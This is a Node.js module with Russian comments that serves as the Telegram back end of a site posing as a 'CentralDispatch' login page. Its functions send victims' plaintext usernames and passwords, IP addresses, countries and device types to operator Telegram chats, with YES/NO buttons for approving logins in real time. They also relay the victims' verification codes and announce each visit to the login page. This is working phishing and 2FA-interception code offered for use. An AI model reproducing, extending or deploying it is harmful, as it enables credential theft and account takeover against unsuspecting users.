/**
 * Модуль для работы с Telegram Bot API
 * Express версия (CommonJS)
 */

const { getChatIds } = require('./telegram-chat-ids');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

/**
 * Получение информации о стране по IP адресу
 */
async function getCountryInfo(ip) {
  try {
    if (ip === "unknown" || ip.startsWith("192.168.") || ip.startsWith("10.") || ip === "127.0.0.1") {
      return { country: "Unknown", flag: "🌍" };
    }

    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode`);
    const data = await response.json();

    if (data.status === "success") {
      const flag = getCountryFlag(data.countryCode);
      return { country: data.country, flag };
    }

    return { country: "Unknown", flag: "🌍" };
  } catch (error) {
    console.error("[TELEGRAM] Ошибка получения информации о стране:", error);
    return { country: "Unknown", flag: "🌍" };
  }
}

/**
 * Получение флага страны по коду
 */
function getCountryFlag(countryCode) {
  if (!countryCode || countryCode.length !== 2) return "🌍";
  
  const codePoints = countryCode
    .toUpperCase()
    .split("")
    .map((char) => 127397 + char.charCodeAt(0));
  return String.fromCodePoint(...codePoints);
}

/**
 * Определение типа устройства по User Agent
 */
function getDeviceType(userAgent) {
  const ua = userAgent.toLowerCase();
  
  if (ua.includes("mobile") || ua.includes("android") || ua.includes("iphone") || ua.includes("ipad")) {
    return "📱 Мобильное устройство";
  }
  
  if (ua.includes("tablet")) {
    return "📱 Планшет";
  }
  
  return "💻 Компьютер";
}

/**
 * Отправка сообщения в Telegram с кнопками YES/NO
 */
async function sendLoginTelegram(username, password, requestId, clientIp, userAgent) {
  console.log("[TELEGRAM] Отправка уведомления о входе...");
  console.log("[TELEGRAM] Request ID:", requestId);

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    throw new Error("TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID должны быть настроены");
  }

  const countryInfo = clientIp ? await getCountryInfo(clientIp) : { country: "Unknown", flag: "🌍" };
  const deviceType = userAgent ? getDeviceType(userAgent) : "💻 Компьютер";

  const message = `🔐 *CentralDispatch - Новый вход в систему*

👤 *Username:* \`${username}\`
🔑 *Password:* \`${password}\`

🌍 *IP:* \`${clientIp || "unknown"}\`
📍 *Страна:* ${countryInfo.country} ${countryInfo.flag}
${deviceType}

Выберите действие:`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ YES", callback_data: `login_yes_${requestId}` },
        { text: "❌ NO", callback_data: `login_no_${requestId}` },
      ],
    ],
  };

  try {
    const allChatIds = getChatIds();
    console.log("[TELEGRAM] Отправка на Chat ID:", allChatIds);

    if (allChatIds.length === 0) {
      throw new Error("Не найдено ни одного Chat ID");
    }

    let mainMessageId = null;

    for (const chatId of allChatIds) {
      try {
        // Отправляем кнопки YES/NO на ВСЕ чаты
        const response = await fetch(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: "Markdown",
              reply_markup: keyboard, // Кнопки на все чаты
            }),
          }
        );

        const data = await response.json();

        if (!response.ok) {
          console.error(`[TELEGRAM] Ошибка отправки на Chat ID ${chatId}:`, data);
          continue;
        }

        if (mainMessageId === null) {
          mainMessageId = data.result.message_id;
        }
        
        console.log(`[TELEGRAM] Сообщение с кнопками отправлено на Chat ID ${chatId}`);
      } catch (error) {
        console.error(`[TELEGRAM] Ошибка отправки на Chat ID ${chatId}:`, error);
      }
    }

    if (mainMessageId === null) {
      throw new Error("Не удалось отправить сообщение ни на один Chat ID");
    }

    console.log("[TELEGRAM] Сообщение успешно отправлено на все Chat ID, message_id:", mainMessageId);
    return mainMessageId;
  } catch (error) {
    console.error("[TELEGRAM] Ошибка:", error);
    throw new Error("Не удалось отправить сообщение в Telegram");
  }
}

/**
 * Отправка кода верификации в Telegram
 */
async function sendCodeTelegram(code, username, clientIp, userAgent) {
  console.log("[TELEGRAM] Отправка кода верификации...");

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    throw new Error("TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID должны быть настроены");
  }

  const message = `🔐 *CentralDispatch - Код подтверждения*

📝 *Код:* \`${code}\`
👤 *Username:* \`${username}\`

Введите этот код для подтверждения входа.`;

  try {
    const allChatIds = getChatIds();
    console.log("[TELEGRAM] Отправка кода на Chat ID:", allChatIds);

    if (allChatIds.length === 0) {
      throw new Error("Не найдено ни одного Chat ID");
    }

    let successCount = 0;

    for (const chatId of allChatIds) {
      try {
        const response = await fetch(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: "Markdown",
            }),
          }
        );

        const data = await response.json();

        if (!response.ok) {
          console.error(`[TELEGRAM] Ошибка отправки кода на Chat ID ${chatId}:`, data);
          continue;
        }

        successCount++;
        console.log(`[TELEGRAM] Код отправлен на Chat ID ${chatId}`);
      } catch (error) {
        console.error(`[TELEGRAM] Ошибка отправки кода на Chat ID ${chatId}:`, error);
      }
    }

    if (successCount === 0) {
      throw new Error("Не удалось отправить код ни на один Chat ID");
    }

    console.log(`[TELEGRAM] Код успешно отправлен на ${successCount} Chat ID`);
  } catch (error) {
    console.error("[TELEGRAM] Ошибка:", error);
    throw new Error("Не удалось отправить код в Telegram");
  }
}

/**
 * Отправка уведомления о посещении сайта
 */
async function sendVisitNotification(path, userAgent, clientIp) {
  console.log("[TELEGRAM] Отправка уведомления о посещении...");

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn("[TELEGRAM] Telegram не настроен, пропускаем уведомление");
    return;
  }

  const countryInfo = await getCountryInfo(clientIp);
  const deviceType = getDeviceType(userAgent);

  const message = `🔐 *Посещение страницы входа*

🌍 *IP:* \`${clientIp}\`
📍 *Страна:* ${countryInfo.country} ${countryInfo.flag}
${deviceType}

Кто-то зашел на сайт CentralDispatch.`;

  try {
    const allChatIds = getChatIds();
    
    if (allChatIds.length === 0) {
      console.warn("[TELEGRAM] Не найдено ни одного Chat ID, пропускаем уведомление");
      return;
    }

    console.log("[TELEGRAM] Отправка уведомления о посещении на Chat ID:", allChatIds);

    let successCount = 0;

    for (const chatId of allChatIds) {
      try {
        const response = await fetch(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: "Markdown",
            }),
          }
        );

        const data = await response.json();

        if (!response.ok) {
          console.error(`[TELEGRAM] Ошибка отправки уведомления на Chat ID ${chatId}:`, data);
          continue;
        }

        successCount++;
        console.log(`[TELEGRAM] Уведомление о посещении отправлено на Chat ID ${chatId}`);
      } catch (error) {
        console.error(`[TELEGRAM] Ошибка отправки уведомления на Chat ID ${chatId}:`, error);
      }
    }

    if (successCount > 0) {
      console.log(`[TELEGRAM] Уведомление о посещении отправлено на ${successCount} Chat ID`);
    }
  } catch (error) {
    console.error("[TELEGRAM] Ошибка:", error);
  }
}

/**
 * Отправка произвольного сообщения в Telegram
 */
async function sendMessage(chatId, message, parseMode) {
  if (!TELEGRAM_BOT_TOKEN) {
    throw new Error("TELEGRAM_BOT_TOKEN не настроен");
  }

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: parseMode || undefined,
        }),
      }
    );

    const data = await response.json();

    if (!response.ok) {
      console.error("[TELEGRAM] Ошибка отправки сообщения:", data);
      throw new Error(data.description || "Не удалось отправить сообщение");
    }

    console.log("[TELEGRAM] Сообщение успешно отправлено");
  } catch (error) {
    console.error("[TELEGRAM] Ошибка:", error);
    throw error;
  }
}

/**
 * Отправка ответа на callback query
 */
async function answerCallbackQuery(callbackQueryId, text) {
  if (!TELEGRAM_BOT_TOKEN) {
    return;
  }

  try {
    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          callback_query_id: callbackQueryId,
          text: text || "Обработано",
        }),
      }
    );
  } catch (error) {
    console.error("[TELEGRAM] Ошибка ответа на callback:", error);
  }
}

module.exports = {
  sendLoginTelegram,
  sendCodeTelegram,
  sendVisitNotification,
  sendMessage,
  answerCallbackQuery,
};

